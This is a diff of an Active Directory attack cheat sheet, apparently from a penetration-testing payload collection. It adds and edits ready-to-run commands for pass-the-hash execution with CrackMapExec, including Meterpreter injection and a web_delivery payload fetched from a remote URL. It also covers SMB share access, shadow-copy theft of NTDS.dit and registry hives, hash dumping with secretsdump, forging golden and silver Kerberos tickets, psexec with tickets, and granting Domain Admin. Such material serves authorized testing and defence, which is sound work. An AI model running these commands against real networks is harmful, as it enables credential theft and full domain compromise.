@@ -4,10 +4,12 @@
 * [Tools](#tools)
 * [Most common paths to AD compromise](#most-common-paths-to-ad-compromise)
   * [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
+  * [Open Shares](#open-shares)
   * [GPO - Pivoting with Local Admin & Passwords in SYSVOL](#gpo---pivoting-with-local-admin--passwords-in-sysvol)
   * [Dumping AD Domain Credentials ](#dumping-ad-domain-credentials-systemrootntdsntdsdit)
-  * [Golden Tickets](#golden-tickets)
-  * [Silver Tickets](#silver-tickets)
+  * [Password in AD User comment](#password-in-ad-user-comment)
+  * [Golden Tickets](#passtheticket-golden-tickets)
+  * [Silver Tickets](#passtheticket-silver-tickets)
   * [Trust Tickets](#trust-tickets)
   * [Kerberoast](#kerberoast)
   * [Pass-the-Hash](#pass-the-hash)
@@ -33,6 +35,7 @@ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
 crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --shares
 crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
 crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
+crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
 ```
 * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 ```powershell
@@ -53,6 +56,20 @@ git clone https://github.com/bidord/pykek
 python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword>
 python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org
 mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
+```
+
+## Open Shares
+```powershell
+pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
+ls # list files
+cd 
+get # download files
+put # replace a file
+```
+
+Mount a share
+```powershell
+smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
 ```
 
 
@@ -106,6 +123,21 @@ vssadmin create shadow /for=C :
 Copy Shadow_Copy_Volume_Name\windows\ntds\ntds.dit c:\ntds.dit
 ```
 
+You can also use the Nishang script, available at : [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
+```powershell
+Import-Module .\Copy-VSS.ps1
+Copy-VSS
+Copy-VSS -DestinationDir C:\ShadowCopy\
+```
+
+**Using vssadmin**
+```powershell
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
+```
+
+
 **Using DiskShadow (a Windows signed binary)**
 ```powershell
 diskshadow.txt contains :
@@ -118,6 +150,7 @@ delete shadows volume %someAlias%
 reset
 
 then:
+NOTE - must be executed from C:\Windows\System32
 diskshadow.exe /s  c:\diskshadow.txt
 dir c:\exfil
 reg.exe save hklm\system c:\exfil\system.bak
@@ -126,11 +159,12 @@ reg.exe save hklm\system c:\exfil\system.bak
 **Extract hashes from ntds.dit**    
 then you need to use secretsdump to extract the hashes
 ```c
-secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
 ```
 secretsdump also works remotely
 ```c
-./secretsdump.py IP administrator@domain -use-vss
+./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss
+./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
 ```
 
 
@@ -150,7 +184,7 @@ CrackMapExec module
 cme smb 10.10.0.202 -u username -p password --ntds vss
 ```
 
-## Password in AD User comment
+### Password in AD User comment
 ```powershell
 enum4linux | grep -i desc
 There are 3-4 fields that seem to be common in most AD schemas: 
@@ -158,7 +192,7 @@ UserPassword, UnixUserPassword, unicodePwd and msSFU30Password.
 ```
 
 
-### Golden Tickets
+### PassTheTicket Golden Tickets
 Forge a TGT, require krbtgt key
 
 Mimikatz version
@@ -187,11 +221,36 @@ kerberos_ticket_use /root/Downloads/pentestlabuser.tck
 kerberos_ticket_list
 ```
 
-### Silver Tickets
-Forge a TGS, require machine accound password (key) from the KDC
+Using a ticket on Linux
+```powershell
+Convert the ticket kirbi to ccache with kekeo
+misc::convert ccache ticket.kirbi
+
+Alternatively you can use ticketer from Impacket
+./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da
+
+export KRB5CCNAME=/home/user/ticket.ccache
+cat $KRB5CCNAME
+
+
+NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file
+./psexec.py -k -no-pass --dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
+```
+
+### PassTheTicket Silver Tickets
+Forging a TGS require machine accound password (key) from the KDC
+```powershell
+Create a ticket for the service
+kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE
+
+Then use the same steps as a Golden ticket
+misc::convert ccache ticket.kirbi
+export KRB5CCNAME=/home/user/ticket.ccache
+./psexec.py -k -no-pass --dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
+```
 
 ### Trust Tickets
-
+TODO
 
 ### Kerberoast
 ```c
@@ -275,6 +334,7 @@ Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -n
 
 
 ### PrivEsc Local Admin - MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
+Check if the patch is installed : `wmic qfe list | find "3139914"`
 ```
 Powershell:
 https://www.exploit-db.com/exploits/39719/
@@ -314,5 +374,6 @@ net group "Domain Admins" hacker2 /add /domain
  * [Pen Testing Active Directory Environments - Part V: Admins and Graphs](https://blog.varonis.com/pen-testing-active-directory-v-admins-graphs/)
  * [Pen Testing Active Directory Environments - Part VI: The Final Case](https://blog.varonis.com/pen-testing-active-directory-part-vi-final-case/)
  * [Passing the hash with native RDP client (mstsc.exe)](https://michael-eder.net/post/2018/native_rdp_pass_the_hash/)
- *[Fun with LDAP, Kerberos (and MSRPC) in AD Environments](https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments)
+ * [Fun with LDAP, Kerberos (and MSRPC) in AD Environments](https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments)
  * [DiskShadow The return of VSS Evasion Persistence and AD DB extraction](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
+ * [How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)
